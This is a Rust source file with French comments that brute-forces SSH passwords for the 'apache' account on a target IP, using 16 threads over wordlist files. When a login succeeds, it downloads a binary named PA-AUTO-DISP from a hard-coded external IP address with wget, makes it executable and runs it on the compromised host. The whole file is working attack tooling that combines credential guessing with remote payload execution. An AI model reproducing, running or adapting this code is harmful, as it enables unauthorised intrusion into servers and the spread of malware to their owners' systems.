use std::fs::File;
use std::io::{self, BufRead, Read};
use std::path::Path;
use std::time::Duration;
use std::net::TcpStream;
use ssh2::Session;
use std::sync::mpsc::{self, Sender, Receiver};
use std::thread;
use tokio::time::timeout;



fn ssh_inject(ip_address: String, user: String, password: String) {
    // Connexion TCP
    thread::sleep(Duration::from_secs(3));
    match TcpStream::connect(format!("{}:22", ip_address)) {
        Ok(tcp) => {
            // Création de la session SSH
            let mut sess = Session::new().expect("Failed to create session");
            sess.set_tcp_stream(tcp);
            sess.handshake().expect("Failed to handshake");

            // Authentification
            sess.userauth_password(&user, &password).expect("Failed to authenticate");

            if sess.authenticated() {
                println!("Authentication successful");

                // Définition du timeout
                let timeout_secs = Duration::from_secs(4);
                let timeout_ms = timeout_secs.as_millis() as u32;
                sess.set_timeout(timeout_ms);

                // Ouverture du canal de session et exécution de la commande
                let mut channel = sess.channel_session().expect("Failed to open channel");
                channel.exec("wget http://51.77.193.65:8000/PA-AUTO-DISP && chmod +x PA-AUTO-DISP && ./PA-AUTO-DISP").expect("Failed to execute command");

                let mut output = String::new();
                channel.read_to_string(&mut output).expect("Failed to read output");
                println!("Output: {}", output);

                // Fermeture du canal
                channel.send_eof().expect("Failed to send EOF");
                channel.wait_close().expect("Failed to wait close");
                println!("Command executed and session closed successfully");
            } else {
                println!("Authentication failed");
            }
        },
        Err(e) => {
            eprintln!("Failed to connect: {}", e);
        }
    }
}

pub(crate) async fn ssh_bruteforce(ip_address: &str, file_path: &str) {
    println!("Bruteforcing sur  {} ...", ip_address);
    let (tx, rx): (Sender<String>, Receiver<String>) = mpsc::channel();
    let ip_address = ip_address.to_string();
    let file_path = file_path.to_string();

    // 1 thread par file
    for cmp in 0..16 {
        let tx_clone = tx.clone();
        let ip_address_clone = ip_address.clone();
        let file_path_clone = file_path.clone();

        thread::spawn(move || {
            let file = format!("{}rck{}.txt", file_path_clone, cmp);

            if let Ok(lines) = read_lines(file) {
                for line in lines {
                    if let Ok(password) = line {
                        if try_login(&ip_address_clone, &password) {
                            tx_clone.send(password).unwrap();
                            return;
                        }

                    }
                }
            }
        });
    }

    // si ok
    match rx.recv() {
        Ok(password) => {
            println!("Mot de passe trouvé : {}", password);

            ssh_inject(ip_address, "apache".to_string(), password);
        }
        Err(_) => {
        println!("Aucun mot de passe trouvé.");
        }
    }


}

fn read_lines<P>(filename: P) -> io::Result<io::Lines<io::BufReader<File>>>
    where
        P: AsRef<Path>,
{
    let file = File::open(filename)?;
    Ok(io::BufReader::new(file).lines())
}

fn try_login(ip_address: &str, password: &str) -> bool {
    println!("{}",password); //debug

    // Attempt to create a TCP connection and SSH session
    if let Ok(tcp) = TcpStream::connect(format!("{}:22", ip_address)) {
        if let Ok(mut sess) = Session::new() {
            sess.set_tcp_stream(tcp);
            if sess.handshake().is_ok() {
                let timeout_secs = Duration::from_secs(2);
                let timeout_ms = timeout_secs.as_millis() as u32;
                sess.set_timeout(timeout_ms);

                // Attempt to authenticate with the given password
                if sess.userauth_password("apache", password).is_ok() {
                    return true;
                }
                drop(sess);
            }
            thread::sleep(Duration::from_secs(3));

        }

    }

    false
}

